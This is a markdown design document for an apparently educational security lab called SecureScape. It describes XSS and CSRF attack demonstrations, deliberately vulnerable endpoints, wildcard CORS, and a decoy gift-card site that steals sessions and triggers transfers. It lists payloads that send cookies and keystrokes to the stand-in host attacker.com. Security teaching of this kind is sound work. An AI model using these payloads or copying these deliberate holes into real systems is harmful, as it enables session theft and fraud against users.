# Security Enhancements - XSS and CSRF Attack Simulations

This document describes the comprehensive enhancements made to the SecureScape project for XSS and CSRF attack demonstrations.

## Overview

The project has been enhanced with:
1. **Multiple XSS attack types** with detailed payloads and execution methods
2. **Multiple CSRF attack vectors** with live demonstrations
3. **External CSRF attack site** that steals session IDs and performs unauthorized actions
4. **Enhanced backend endpoints** for session information and attack simulations

## XSS Enhancements

### New Attack Types

#### 1. **Stored XSS** (Persistent XSS)
- Malicious scripts stored in the database
- Executes when other users view the content
- **Payloads Added:**
  - Basic Alert: `<script>alert('XSS')</script>`
  - Cookie Stealer: `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`
  - Session Hijacker: `<script>new Image().src='http://attacker.com/session?sid='+document.cookie</script>`
  - Keylogger: `<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>`
  - Phishing Form: Fake login forms
  - Image XSS: `<img src=x onerror='alert("XSS")'>`
  - SVG XSS: `<svg onload='alert("XSS")'></svg>`
  - Iframe Injection: `<iframe src='javascript:alert("XSS")'></iframe>`

#### 2. **Reflected XSS** (Non-Persistent XSS)
- Malicious scripts reflected in search results or URL parameters
- New endpoint: `GET /api/attack/xss/search?q=<payload>`
- Demonstrates how user input is directly reflected without encoding

#### 3. **DOM-based XSS**
- Client-side vulnerability demonstration
- Shows how URL hash manipulation can lead to XSS
- Educational content on DOM manipulation vulnerabilities

#### 4. **Cookie & Session Stealing**
- New endpoint: `GET /api/attack/xss/session-info`
- Demonstrates how XSS can steal:
  - Session IDs
  - Cookies
  - User agent information
  - IP addresses
- Shows real-time session information that can be stolen

### Frontend Enhancements

- **Tabbed Interface**: Organized attack types into tabs (Stored, Reflected, DOM, Cookie Stealing)
- **Payload Library**: Click-to-use payloads for each attack type
- **Live Execution**: See attacks execute in real-time
- **Session Info Display**: Shows what information can be stolen

## CSRF Enhancements

### New Attack Methods

#### 1. **Form Auto-Submit Attack**
- Hidden form that auto-submits when page loads
- Demonstrates how malicious sites can trigger actions without user interaction

#### 2. **Image Tag Attack (GET Request)**
- Using `<img>` tag to trigger GET requests
- New endpoint: `GET /api/attack/csrf/transfer?to=<account>&amount=<amount>`
- Works even if JavaScript is disabled

#### 3. **AJAX/Fetch Attack**
- Using JavaScript `fetch()` API to send POST requests
- Demonstrates modern CSRF attack vectors

#### 4. **Link-Based Attack**
- Tricking users to click malicious links
- Educational demonstration of social engineering combined with CSRF

#### 5. **Session Stealing Combined with CSRF**
- New endpoints:
  - `GET /api/attack/csrf/session-info` - Steal session information
  - `GET /api/attack/csrf/profile` - Access user profile data
- Shows how CSRF can be combined with session theft

### Frontend Enhancements

- **Tabbed Interface**: Organized into Form, Attacks, and Session Stealing tabs
- **Attack Method Examples**: Code examples for each attack type
- **Live Attack Simulation**: Button to open external attack site
- **Session Information Display**: Shows what can be stolen

## External CSRF Attack Site

### Location
`SecureScape/csrf-attack-site/csrf-attack.html`

### Features

1. **Realistic Appearance**
   - Looks like a legitimate "Free Gift Card" website
   - Professional design to demonstrate social engineering

2. **Automatic Attack Execution**
   - Steals session ID and cookies on page load
   - Retrieves user profile information
   - Performs unauthorized money transfers
   - Attempts multiple attack vectors

3. **Attack Log**
   - Shows all attack activity in real-time
   - Displays stolen data
   - Demonstrates what attackers can see

4. **Multiple Attack Vectors**
   - POST request via fetch API
   - GET request via image tag
   - Form auto-submit (commented out to prevent navigation)

### How to Use

1. **Start the attack site server:**
   ```bash
   cd SecureScape/csrf-attack-site
   npm start
   # or
   node server.js
   # or
   python -m http.server 8081
   ```

2. **Access the site:**
   - Direct URL: `http://localhost:8081/csrf-attack.html`
   - Or click "Open Malicious CSRF Attack Site" button in the CSRF demo page

3. **Make sure you're logged in** to the main application (or have an active session)

4. **Open the attack site** - attacks will execute automatically

### What Happens

When you visit the attack site:

1. **Session Theft**: Attempts to steal your session ID and cookies
2. **Profile Theft**: Retrieves your profile information
3. **Unauthorized Transfer**: Attempts to transfer money to attacker's account
4. **Multiple Vectors**: Tries different attack methods
5. **Real-time Logging**: All activity is logged and displayed

### Security Testing

- **Insecure Mode**: Attacks succeed, demonstrating the vulnerability
- **Secure Mode**: Attacks fail, demonstrating CSRF token protection

## Backend Enhancements

### New Endpoints

#### XSS Endpoints
- `GET /api/attack/xss/search?q=<query>` - Reflected XSS endpoint
- `GET /api/attack/xss/session-info` - Session information (for cookie stealing demo)

#### CSRF Endpoints
- `GET /api/attack/csrf/transfer?to=<account>&amount=<amount>` - GET-based CSRF
- `GET /api/attack/csrf/session-info` - Session information
- `GET /api/attack/csrf/profile` - User profile information

### CORS Configuration

- Updated CORS to allow all origins (`origins = "*"`) for attack simulation
- This allows the external attack site to make requests to the backend
- **Note**: This is for educational purposes only and should never be used in production

## File Structure

```
SecureScape/
├── backend/
│   └── src/main/java/com/securescape/controller/
│       ├── AttackXssController.java (enhanced)
│       └── AttackCsrfController.java (enhanced)
├── frontend/
│   └── src/
│       ├── pages/
│       │   ├── XSS.jsx (enhanced with tabs and multiple attack types)
│       │   └── CSRF.jsx (enhanced with tabs and attack methods)
│       └── services/
│           └── api.js (added new endpoints)
└── csrf-attack-site/
    ├── csrf-attack.html (external attack site)
    ├── server.js (simple HTTP server)
    ├── package.json
    └── README.md
```

## Usage Instructions

### Running the Complete Demo

1. **Start Backend:**
   ```bash
   cd SecureScape/backend
   mvn spring-boot:run
   ```
   Backend runs on `http://localhost:5000`

2. **Start Frontend:**
   ```bash
   cd SecureScape/frontend
   npm install
   npm run dev
   ```
   Frontend runs on `http://localhost:3000`

3. **Start CSRF Attack Site:**
   ```bash
   cd SecureScape/csrf-attack-site
   npm install
   npm start
   ```
   Attack site runs on `http://localhost:8081`

4. **Access the Application:**
   - Main app: `http://localhost:3000`
   - Navigate to XSS or CSRF pages
   - Try different attack types
   - Open the external CSRF attack site from the CSRF page

## Educational Value

These enhancements provide:

1. **Comprehensive Attack Coverage**: Multiple attack vectors for both XSS and CSRF
2. **Real-World Examples**: Realistic attack scenarios and payloads
3. **Interactive Learning**: Hands-on experience with attack execution
4. **Visual Feedback**: See attacks succeed or fail based on security mode
5. **Code Examples**: Learn how attacks work and how to prevent them

## Security Notes

⚠️ **IMPORTANT**: 
- These are **educational demonstrations only**
- Never deploy vulnerable endpoints to production
- Only use in controlled, isolated environments
- The attack site is intentionally transparent for educational purposes
- In real attacks, malicious sites hide all attack activity

## Future Enhancements

Potential additions:
- More XSS payloads (polyglot payloads, filter bypasses)
- More CSRF attack vectors (JSON CSRF, file upload CSRF)
- Additional security headers demonstrations
- Content Security Policy (CSP) demonstrations
- SameSite cookie attribute demonstrations
